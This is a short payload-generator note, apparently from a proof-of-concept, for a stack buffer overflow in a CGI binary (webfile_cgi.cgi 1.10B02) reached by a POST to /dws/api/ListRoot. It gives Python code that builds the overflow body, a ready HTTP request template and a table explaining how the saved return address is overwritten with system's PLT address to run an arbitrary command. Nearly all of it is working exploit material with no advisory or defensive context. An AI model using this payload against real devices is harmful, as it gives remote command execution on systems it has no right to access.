# Raw request / payload generator

The body contains NUL bytes, so generate it with Python rather than typing it into a
shell. The code below is the same construction used by the PoC.

```python
import struct

cmd = b"uname -a"
value = (
    b"\x00"
    + b"A" * 1026
    + struct.pack(">I", 0) * 5
    + struct.pack(">I", 0x40D180)   # .system PLT, webfile_cgi.cgi 1.10B02
)
assert len(value) == 1051
body = b"x=0" + cmd + b"&" * 49 + b"a=" + value
```

HTTP:

```http
POST /dws/api/ListRoot HTTP/1.1
Host: TARGET:8181
Content-Type: application/x-www-form-urlencoded
Content-Length: <len(body)>

<body>
```

Layout:

| Part | Meaning |
|---|---|
| `x=0<cmd>` | field 0 value is `0<cmd>`; `$a0` becomes `&value[1]` = `<cmd>` |
| 49 `&` | advance to field index 49 |
| `a=` | field 49 name |
| `value[1051]` | NUL + 1026 filler + 5 saved `$s` + `$ra` |
| `$ra` | `0x40d180`, `.system` PLT |
